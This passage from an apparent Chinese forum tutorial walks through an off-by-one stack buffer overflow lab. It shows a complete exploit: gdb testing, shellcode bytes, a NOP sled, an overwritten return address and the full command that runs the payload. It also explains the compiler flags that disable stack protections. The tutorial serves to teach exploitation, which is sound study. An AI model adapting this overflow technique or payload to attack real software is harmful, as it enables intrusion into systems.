
其中`leave`指令：本质作用是方法调用完成后，消除相关栈上的数据。

```
leave: mov esp,ebp;   pop ebp;
```

`ret/retn`指令：将栈顶上的地址传递给`EIP`，即`move EIP,ESP`。然后程序执行流程就会跳转到`EIP`所指向的位置继续执行。

正常`bar`函数执行完以后，栈上的空间布局如下：

![](https://bbs.kanxue.com/upload/attach/201707/591834_fsvncbdocirs2dk.png)

现在由于程序存在`offbyone`漏洞，攻击者覆盖`foo`的`EBP`的`LSB`之后，`bar`函数执行完以后，栈上的空间布局如下：

![](https://bbs.kanxue.com/upload/attach/201707/591834_73nzdwx643v9dqn.png)

**触发漏洞：**

首先先测试一下是否能够如上论述一样，能够控制`EIP`：

```
gdb vuln
(gdb) r `python -c 'print "A"*256'`
```

![](https://bbs.kanxue.com/upload/attach/201707/591834_423b6qvjix3qa88.png)

上图执行结果表明，`EBP`已经被覆盖，我们可以控制`EIP`寄存器的值。

那现在如何漏洞利用，达到命令执行呢？也就是如何构造`buf`缓冲区的内容？由于`buf`位于`0xbffff488-584`之间，就是代码中申请的`0x100`(256)字节。此外`foo`的`EBP`被覆盖之后，执行`leave`和`retn`指令时，会把`0xbffff504`(下文统一省去`0xbffff`的前缀)中的数据当成`EIP`，所以`0x504`的位置上数据应该是伪造的返回地址。而`0x488-0x504`(不包含`0x504`)之间的数据，用字符`"A"`来填充，`0x504-0x488=124`;为了执行任意代码，我们选定一串shellcode(可以从网址[b8cK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4Z5k6h3I4D9i4K6u0V1M7%4c8G2M7X3#2Q4x3X3g2G2M7X3N6Q4x3V1k6K6K9r3g2D9L8r3y4G2k6r3g2Q4x3V1j5`.](https://bbs.kanxue.com/elink@a76K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4Z5k6h3I4D9i4K6u0V1M7%4c8G2M7X3#2Q4x3X3g2G2M7X3N6Q4x3V1k6K6K9r3g2D9L8r3y4G2k6r3g2Q4x3V1j5`.)选择)，

`Shellcode="\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68\x61\x63\x6b\x65\x64\x23"`，长度为36个bytes，该shellcode作用是在当前目录下`mkdir hacked`，然后退出。

我们将该shellcode存在`0x548`处(也可以在`0x538`等地方，位置不限)，现在栈上`0x548-0x568`(包含`0x568`)存放着待执行的shellcode。

剩下两处地方：一是`buf`末尾`0x56C-0x588=28`，用字符`"A"`来填充；另一处是`0x508-0x548`(不包含`0x548`)，用`NOP`来填充。整个`buf`如下：

![](https://bbs.kanxue.com/upload/attach/201707/591834_yuyqh13qnwuog45.png)

执行命令:

```
./vuln `python -c 'print   "A"*124+"\x48\xf5\xff\xbf"+"\x90"*64+"\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68\x61\x63\x6b\x65\x64\x23"+"A"*28'`
```

执行结果如下：`hacked`文件夹在当前目录下被创建。

![](https://bbs.kanxue.com/upload/attach/201707/591834_ex0bsvxporqedru.png)

#### 三、其他说明和参考资料

##### 3.1 GCC编译参数说明

`-fno-stack-protector`选项：关闭栈上的`gs`验证码。

`gcc`编译器专门为防止缓冲区溢出而采取的保护措施，具体方法是`gcc`首先在缓冲区被写入之前在`buf`的结束地址之后返回地址之前放入随机的`gs`验证码，并在缓冲区写入操作结束时检验该值。通常缓冲区溢出会从低地址到高地址覆写内存，所以如果要覆写返回地址，则需要覆写该`gs`验证码。这样就可以通过比较写入前和写入后`gs`验证码的数据，判断是否产生溢出。

`-z execstack`选项：关闭`ld`链接器堆栈段不可执行机制。

`ld`链接器在链接程序的时候，如果所有的`.o`文件的堆栈段都标记为不可执行，那么整个库的堆栈段才会被标记为不可执行；相反，即使只有一个`.o`文件的堆栈段被标记为可执行，那么整个库的堆栈段将被标记为可执行。检查堆栈段可执行性的方法是：

如果是检查ELF库：`readelf -lW $BIN | grep GNU_STACK`查看是否有`E`标记

如果是检查生成的`.o`文件：`scanelf -e $BIN`查看是否有`X`标记

`ld`链接器如果将堆栈段标记为不可执行，即使控制了`eip`产生了跳转，依然会产生段错误。

`-mpreferred-stack-boundary=num`选项：让`gcc`编译器将堆栈指针按照`2^num`边界对齐。

Linux上该漏洞演示时，需要添加编译参数：`-mpreferred-stack-boundary=num`，该参数的意思是：让`gcc`编译器将堆栈指针按照`4-byte(2^2=4)`边界对齐(会较少栈的空间，但是指令访问会需要更多时间)。默认情况下，`gcc`编译器将堆栈指针采取`16-byte`边界对齐。不添加该参数时，缓冲区`buf`和`EBP`的结尾之间找到一个对齐空间（最多12个字节），这不允许我们覆盖`EBP`的`LSB`。

`-g`：便于`gdb`调试。

##### 3.2 无法覆盖`EBP`的`LSB`

目标缓冲区之上可能存在其他局部变量。

```c
void bar(char *arg) {
    int x = 10; /* [1] */
    char buf[256]; /* [2] */
    strcpy(buf, arg); /* [3] */
}
```

因此，在这些情况下，在缓冲区`buf`和`EBP`的结尾之间找到了一个局部变量，它不允许我们覆盖`EBP`的`LSB`！

##### 3.3 参考资料

1. http://bbs.pediy.com/thread-216954.htm

2. [3aeK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1K9r3q4$3j5h3I4C8j5i4m8A6L8q4)9J5k6h3y4G2L8g2)9J5c8X3u0D9L8$3N6K6i4K6u0r3f1$3S2W2L8r3I4U0L8$3c8W2i4K6u0V1d9h3&6B7k6h3y4@1K9h3!0F1i4K6u0r3](https://bbs.kanxue.com/elink@bc1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1K9r3q4$3j5h3I4C8j5i4m8A6L8q4)9J5k6h3y4G2L8g2)9J5c8X3u0D9L8$3N6K6i4K6u0r3f1$3S2W2L8r3I4U0L8$3c8W2i4K6u0V1d9h3&6B7k6h3y4@1K9h3!0F1i4K6u0r3)

3. 69dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6M7r3I4G2K9i4c8X3N6h3&6Q4x3X3g2%4L8%4u0V1M7s2u0W2M7%4y4Q4x3X3g2U0L8$3#2Q4x3V1j5J5x3o6p5#2i4K6u0r3x3o6k6Q4x3V1j5H3y4#2)9J5c8X3!0X3k6W2)9J5k6r3u0&6i4K6u0V1L8$3&6W2i4K6u0V1N6Y4g2D9L8X3g2J5j5h3u0A6L8r3W2@1P5g2)9J5k6s2y4@1j5h3y4C8i4K6u0V1j5X3q4K6k6h3c8Q4x3X3b7J5i4K6u0r3

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
